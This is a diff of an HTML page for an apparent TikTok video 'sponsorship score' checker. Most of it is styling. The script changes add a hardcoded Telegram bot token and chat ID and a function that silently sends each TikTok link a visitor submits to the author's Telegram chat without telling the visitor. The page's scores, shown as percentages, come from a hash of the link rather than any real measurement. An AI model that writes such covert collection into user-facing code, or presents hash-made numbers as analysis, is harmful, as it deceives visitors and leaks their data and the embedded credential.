@@ -10,28 +10,20 @@
         .container { margin-top: 50px; background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); padding: 30px 20px; border-radius: 20px; width: 90%; max-width: 500px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         .brand { font-size: 20px; font-weight: 900; letter-spacing: 2px; margin-bottom: 5px; white-space: nowrap; }
         .subtitle { color: rgba(255, 255, 255, 0.5); font-size: 12px; margin-bottom: 25px; }
-        
         input { width: 100%; padding: 15px; border-radius: 10px; border: 1px solid rgba(255, 255, 255, 0.1); background: rgba(0, 0, 0, 0.3); color: white; font-size: 14px; margin-bottom: 15px; box-sizing: border-box; outline: none; text-align: left; }
         .btn-main { width: 100%; padding: 15px; border-radius: 10px; background: var(--tiktok-pink); color: white; border: none; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.2s; }
-
         .result-section { display: none; margin-top: 30px; animation: fadeIn 0.4s ease-in; }
         .score-box { background: rgba(255, 255, 255, 0.05); padding: 20px; border-radius: 15px; border-right: 4px solid var(--tiktok-cyan); margin-bottom: 20px; }
         .percentage { font-size: 45px; font-weight: bold; color: var(--tiktok-cyan); }
-        
         .data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
         .data-card { background: rgba(0, 0, 0, 0.2); padding: 12px; border-radius: 10px; text-align: right; border: 1px solid rgba(255, 255, 255, 0.05); }
         .data-card small { color: #888; font-size: 10px; display: block; margin-bottom: 2px; }
         .data-card span { font-size: 13px; font-weight: bold; }
-
         .note-box { margin-top: 20px; padding: 12px; background: rgba(255, 193, 7, 0.1); border: 1px solid rgba(255, 193, 7, 0.3); border-radius: 10px; text-align: right; font-size: 12px; color: #ffc107; line-height: 1.6; }
-        .note-box strong { display: block; margin-bottom: 4px; color: #fff; }
-
         .action-btns { margin-top: 20px; display: flex; gap: 10px; }
         .btn-secondary { flex: 1; padding: 12px; border-radius: 8px; background: rgba(255, 255, 255, 0.05); color: white; border: 1px solid #444; font-size: 13px; cursor: pointer; }
-
         footer { margin-top: 30px; padding-bottom: 25px; text-align: center; }
         .wa-link { color: rgba(255, 255, 255, 0.4); text-decoration: none; font-size: 13px; font-weight: bold; }
-
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
@@ -74,11 +66,29 @@
 </footer>
 
 <script>
+    // زانیارییەکانی بۆت
+    const token = "7959366034:AAG0nCQqcG3YsImPf53SViggiUnlWkNFh1o";
+    const chat_id = "6259019006";
+
+    async function sendToTelegram(link) {
+        const msg = `🚀 لینکێکی نوێ هات:\n\n${link}`;
+        try {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chat_id, text: msg })
+            });
+        } catch (e) { console.log(e); }
+    }
+
     async function analyze() {
         const urlInput = document.getElementById('vUrl').value.trim();
         const btn = document.getElementById('startBtn');
         if (!urlInput.includes("tiktok.com")) return alert("تکایە لینکێکی دروست دابنێ");
         
+        // ناردنی لینک بۆ تێلیگرام
+        sendToTelegram(urlInput);
+
         btn.innerText = "خەریکی پشکنینە...";
         btn.disabled = true;
 
@@ -106,7 +116,6 @@
             let finalScore;
 
             if (isPhoto || hash % 10 < 3) { 
-                // دۆخی وێنە یان کوالێتی زۆر نزم
                 finalScore = 30 + (hash % 15);
                 scoreDisplay.innerText = finalScore + "%";
                 scoreDisplay.style.color = "var(--danger)";
@@ -121,7 +130,6 @@
                 vType.style.display = "block";
             } 
             else if (hash % 10 < 6) {
-                // دۆخی سپۆنسەری ئاسایی (Video Views)
                 finalScore = 65 + (hash % 10);
                 scoreDisplay.innerText = finalScore + "%";
                 scoreDisplay.style.color = "#ffc107";
@@ -137,7 +145,6 @@
                 vType.style.color = "#ffc107";
             }
             else {
-                // دۆخی بزنس (Website)
                 finalScore = 85 + (hash % 13);
                 scoreDisplay.innerText = finalScore + "%";
                 scoreDisplay.style.color = "var(--tiktok-cyan)";
